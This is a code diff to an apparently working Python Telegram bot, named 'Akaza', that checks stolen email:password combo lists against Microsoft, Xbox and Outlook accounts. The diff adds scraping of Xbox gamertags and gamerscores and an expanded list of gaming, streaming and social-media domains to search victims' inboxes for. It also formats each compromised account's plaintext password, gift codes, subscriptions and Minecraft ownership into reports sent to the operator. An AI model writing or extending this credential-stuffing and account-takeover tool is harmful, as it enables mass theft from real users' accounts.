@@ -204,33 +204,32 @@ akaza_db = AkazaDatabase(DB)
 # SECTION 5 — TARGET DOMAINS & COMPANIES
 # ============================================================================
 TARGET_DOMAINS = {
-    # Gaming Companies
-    "no-reply@roblox.com": "Roblox",
-    "roblox.com": "Roblox",
-    "steampowered.com": "Steam",
-    "noreply@steampowered.com": "Steam",
-    "epicgames.com": "Epic Games",
-    "riotgames.com": "Riot Games",
-    "ubisoft.com": "Ubisoft",
-    "ea.com": "EA",
-    "blizzard.com": "Blizzard",
-    "supercell.com": "Supercell",
-    "sony@txn-email.playstation.com": "PlayStation",
-    "playstation.com": "PlayStation",
-    "minecraft.net": "Minecraft",
-    # Streaming
-    "netflix.com": "Netflix",
-    "spotify.com": "Spotify",
-    "disneyplus.com": "Disney+",
-    "hulu.com": "Hulu",
-    "hbo.com": "HBO",
-    "amazon.com": "Amazon",
-    "primevideo.com": "Prime Video",
-    "apple.com": "Apple",
-    # Specific domains
-    "account.tiktok.com": "TikTok",
-    "instagram.com": "Instagram",
-    "facebookmail.com": "Facebook",
+    # Gaming - Domain Focus
+    "@roblox.com": "Roblox",
+    "@steampowered.com": "Steam",
+    "@epicgames.com": "Epic Games",
+    "@riotgames.com": "Riot Games",
+    "@ubisoft.com": "Ubisoft",
+    "@ea.com": "EA",
+    "@blizzard.com": "Blizzard",
+    "@id.supercell.com": "Supercell",
+    "@txn-email.playstation.com": "PlayStation",
+    "@sony.com": "Sony/PSN",
+    "@minecraft.net": "Minecraft",
+    "@mojang.com": "Mojang",
+    "@xbox.com": "Xbox",
+    "@microsoft.com": "Microsoft",
+    # Streaming & Digital
+    "@netflix.com": "Netflix",
+    "@spotify.com": "Spotify",
+    "@disneyplus.com": "Disney+",
+    "@hulu.com": "Hulu",
+    "@hbo.com": "HBO",
+    "@amazon.com": "Amazon",
+    "@apple.com": "Apple",
+    "@account.tiktok.com": "TikTok",
+    "@instagram.com": "Instagram",
+    "@facebookmail.com": "Facebook",
 }
 
 # ============================================================================
@@ -632,16 +631,36 @@ class AkazaChecker:
                            d.get('location', {}).get('country') or 'N/A')
                 return name or 'N/A', country
         except: pass
-        # Fallback: Graph API
-        try:
-            r = self.session.get('https://graph.microsoft.com/v1.0/me',
-                                 headers={'Authorization': f'Bearer {tk}'}, timeout=8, verify=False)
-            if r.status_code == 200:
-                d = r.json()
-                return d.get('displayName', 'N/A'), d.get('country', 'N/A')
-        except: pass
         return 'N/A', 'N/A'
 
+    # ── XBOX PROFILE (Gamertag, Gamerscore, Tier) ──────────────────────────
+    def get_xbox_profile(self, xbox_tk):
+        """Fetch Xbox Profile details using XSTS token"""
+        try:
+            if not xbox_tk: return {"gt": "N/A", "score": 0, "tier": "N/A"}
+            h = {
+                "x-xbl-contract-version": "2",
+                "Authorization": f"XBL3.0 x={xbox_tk['user_hash']};{xbox_tk['token']}",
+                "Accept-Language": "en-US",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+            }
+            # Need to get XSTS for profile scope first? Usually xbox_token is already XSTS if produced by do_login
+            # do_login returns {'token': token, 'user_hash': uh, 'raw': data}
+            
+            # Using the Users/Me endpoint
+            r = self.session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore,AccountTier", 
+                                 headers=h, timeout=10, verify=False)
+            if r.status_code == 200:
+                data = r.json()
+                profile = data.get('profileUsers', [{}])[0]
+                settings = {s['id']: s['value'] for s in profile.get('settings', [])}
+                return {
+                    "gt": settings.get('Gamertag', 'N/A'),
+                    "score": settings.get('Gamerscore', '0'),
+                    "tier": settings.get('AccountTier', 'N/A')
+                }
+        except: pass
+        return {"gt": "N/A", "score": 0, "tier": "N/A"}
     # ── MINECRAFT (Xbox Live → XSTS → MC API) ─────────────────────────────
     def get_minecraft_enhanced(self, xbox_tk):
         try:
@@ -851,19 +870,21 @@ class AkazaChecker:
                 except: return None
 
             coros = []
-            # Xbox captures (index 0-3)
+            # Xbox captures (index 0-4)
             if xbox_ok:
                 coros += [safe_run(self.get_rewards_points),
                           safe_run(self.get_redemption_codes),
                           safe_run(self.get_microsoft_subs),
-                          safe_run(self.get_minecraft_enhanced, xbox_token)]
+                          safe_run(self.get_minecraft_enhanced, xbox_token),
+                          safe_run(self.get_xbox_profile, xbox_token)]
             else:
-                coros += [asyncio.coroutine(lambda: 0)() if False else safe_run(lambda: 0),
+                coros += [safe_run(lambda: 0),
                           safe_run(lambda: []),
                           safe_run(lambda: {"status":"FREE","subs":[],"balance":"","card":""}),
-                          safe_run(lambda: {"owned": False})]
+                          safe_run(lambda: {"owned": False}),
+                          safe_run(lambda: {"gt":"N/A","score":"0","tier":"N/A"})]
 
-            # Outlook captures (index 4-9)
+            # Outlook captures (index 5-10)
             if outlook_ok:
                 coros += [safe_run(out_checker.get_profile, outlook_token, cid_out),
                           safe_run(out_checker.scan_inbox_enhanced, outlook_token, cid_out, uk),
@@ -889,17 +910,18 @@ class AkazaChecker:
             codes     = g(1, [])
             subs      = g(2, {"status":"FREE","subs":[],"balance":"","card":""})
             mc        = g(3, {"owned": False})
-            nc        = g(4, ('N/A','N/A'))
+            xbox_prof = g(4, {"gt":"N/A","score":"0","tier":"N/A"})
+            nc        = g(5, ('N/A','N/A'))
             name, country = nc if isinstance(nc, tuple) else ('N/A','N/A')
-            inbox     = g(5, {"total":0,"hits":{}})
-            psn       = g(6, {"count":0,"items":[]})
-            steam     = g(7, {"count":0})
-            supercell = g(8, [])
-            tiktok    = g(9, None)
+            inbox     = g(6, {"total":0,"hits":{}})
+            psn       = g(7, {"count":0,"items":[]})
+            steam     = g(8, {"count":0})
+            supercell = g(9, [])
+            tiktok    = g(10, None)
 
             return {'status': 'hit', 'email': email, 'password': password,
                     'pts': pts, 'codes': codes, 'subs': subs, 'name': name, 'country': country,
-                    'mc': mc, 'inbox': inbox, 'psn': psn, 'steam': steam,
+                    'mc': mc, 'xbox': xbox_prof, 'inbox': inbox, 'psn': psn, 'steam': steam,
                     'supercell': supercell, 'tiktok': tiktok}
 
         except Exception as e:
@@ -996,15 +1018,30 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
             if st == 'hit':
                 hits += 1; pts = data.get('pts', 0); country = data.get('country','N/A')
                 email, password = data['email'], data['password']
-                tier = '💎 ULTRA' if pts >= 20000 else '⭐ PREMIUM' if pts >= 7000 else '🎯 HIT'
-                msg = (f"{tier}\n"
-                       f"📧 `{email}`\n"
-                       f"🔑 `{password}`\n"
-                       f"👤 {data.get('name','N/A')} | 🌍 {country}\n"
-                       f"⭐ Points: `{pts}`\n")
+                xbox = data.get('xbox', {})
+                mc = data.get('mc', {})
+                inbox = data.get('inbox', {})
+                psn = data.get('psn', {})
+                steam = data.get('steam', {})
+                
+                tier = '💎 ULTRA' if pts >= 20000 or (mc and mc.get('owned')) else '⭐ PREMIUM' if pts >= 5000 else '🎯 HIT'
+                msg = (f"<b>{tier} - AKAZA HIT</b>\n"
+                       f"━━━━━━━━━━━━━━━━━━\n"
+                       f"📧 <code>{email}</code>\n"
+                       f"🔑 <code>{password}</code>\n\n"
+                       f"👤 <b>Name:</b> <code>{data.get('name','N/A')}</code>\n"
+                       f"🌍 <b>Region:</b> <code>{country}</code>\n"
+                       f"⭐ <b>Rewards:</b> <code>{pts} Points</code>\n"
+                       f"🎮 <b>Xbox:</b> <code>{xbox.get('gt','N/A')}</code> (Score: {xbox.get('score',0)})\n")
 
-                all_hits_results.append(f"{email}:{password} | Pts:{pts} | {country}")
+                all_hits_results.append(f"{email}:{password} | Pts:{pts} | GT:{xbox.get('gt','N/A')} | {country}")
                 if pts > 0: points_results.append(f"{email}:{password} | {pts} Pts")
+
+                # Minecraft
+                if mc.get('owned'):
+                    msg += f"⛏️ <b>Minecraft:</b> <code>{mc.get('name','Managed')}</code>"
+                    if mc.get('capes'): msg += f" (Capes: {', '.join(mc['capes'])})"
+                    msg += "\n"
 
                 # Codes
                 codes = data.get('codes', [])
@@ -1014,9 +1051,10 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
                         cat = co.get('category','Unknown')
                         cat_map.setdefault(cat, []).append(co)
                         codes_results.append(f"{email}:{password} | {cat}: {co['code']} {co.get('redemption_url','')}")
+                    msg += "🎁 <b>Codes:</b>\n"
                     for cat, clist in cat_map.items():
-                        c_strs = [f"`{co['code']}`" + (f" [Redeem]({co['redemption_url']})" if co.get('redemption_url') else "") for co in clist]
-                        msg += f"🎮 {cat}: {', '.join(c_strs)}\n"
+                        c_strs = [f"<code>{co['code']}</code>" + (f" <a href=\"{co['redemption_url']}\">[Redeem]</a>" if co.get('redemption_url') else "") for co in clist]
+                        msg += f" ├ {cat}: {', '.join(c_strs)}\n"
 
                 # Subscriptions
                 subs_data = data.get('subs', {})
@@ -1028,15 +1066,27 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
                         s_str = su['name']
                         if 'days_remaining' in su: s_str += f" ({su['days_remaining']}d)"
                         sub_lines.append(s_str)
-                    msg += f"🎮 MS Subs: {', '.join(sub_lines)}\n"
+                    msg += f"💎 <b>Subscriptions:</b> {', '.join(sub_lines)}\n"
+                
+                # Gaming Extras
+                extras = []
+                if psn.get('count', 0) > 0: extras.append(f"PSN({psn['count']})")
+                if steam.get('count', 0) > 0: extras.append(f"Steam({steam['count']})")
+                if data.get('supercell'): extras.append(f"SC({len(data['supercell'])})")
+                if data.get('tiktok'): extras.append(f"TikTok(@{data['tiktok']})")
+                if extras: msg += f"🕹️ <b>Gaming:</b> {', '.join(extras)}\n"
 
-                # Inbox
-                inbox = data.get('inbox', {})
+                # Inbox / Domain Hits
                 if inbox.get('total', 0) > 0 or inbox.get('hits'):
-                    kw_str = ", ".join([f"{k}({v})" for k,v in inbox.get('hits', {}).items()])
-                    inbox_results.append(f"{email}:{password} | Total: {inbox.get('total', 0)} | KWs: {kw_str}")
+                    msg += f"📬 <b>Inbox:</b> <code>{inbox.get('total', 0)}</code>"
+                    if inbox.get('hits'):
+                        kw_str = ", ".join([f"<b>{k}</b>({v})" for k,v in inbox.get('hits', {}).items()])
+                        msg += f" | {kw_str}"
+                        inbox_results.append(f"{email}:{password} | Total: {inbox.get('total', 0)} | KWs: {', '.join([f'{k}({v})' for k,v in inbox.get('hits',{}).items()])}")
+                    msg += "\n"
 
-                try: await c.bot.send_message(uid, msg, parse_mode='Markdown', disable_web_page_preview=True)
+                msg += "━━━━━━━━━━━━━━━━━━"
+                try: await c.bot.send_message(uid, msg, parse_mode='HTML', disable_web_page_preview=True)
                 except: pass
                 
                 last_h.append(email); last_h = last_h[-5:]
